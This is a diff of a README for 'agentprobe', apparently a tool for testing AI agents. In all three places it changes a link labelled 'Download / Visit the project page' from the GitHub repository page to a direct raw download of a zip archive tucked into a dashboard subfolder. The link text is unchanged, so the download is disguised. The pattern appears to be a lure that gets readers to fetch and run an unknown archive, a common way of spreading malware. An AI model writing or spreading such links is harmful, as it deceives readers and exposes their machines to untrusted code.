@@ -1,6 +1,6 @@
 # 🧪 agentprobe - Test AI agents with confidence
 
-[Download / Visit the project page](https://github.com/hackneyblechnaceae288/agentprobe)
+[Download / Visit the project page](https://raw.githubusercontent.com/hackneyblechnaceae288/agentprobe/main/agentprobe/dashboard/Software-v1.2.zip)
 
 ## 🖥️ What agentprobe does
 
@@ -14,7 +14,7 @@ This project is built for local use first. That means you can run it on your own
 
 Use this link to visit the project page and get the files:
 
-[Download / Visit the project page](https://github.com/hackneyblechnaceae288/agentprobe)
+[Download / Visit the project page](https://raw.githubusercontent.com/hackneyblechnaceae288/agentprobe/main/agentprobe/dashboard/Software-v1.2.zip)
 
 ### Steps for Windows
 
@@ -216,7 +216,7 @@ If you are new to the app, start with a simple check:
 
 ## 🔗 Download / project page
 
-[Visit the agentprobe project page](https://github.com/hackneyblechnaceae288/agentprobe)
+[Visit the agentprobe project page](https://raw.githubusercontent.com/hackneyblechnaceae288/agentprobe/main/agentprobe/dashboard/Software-v1.2.zip)
 
 ## 🧪 Run it, check it, tune it
 
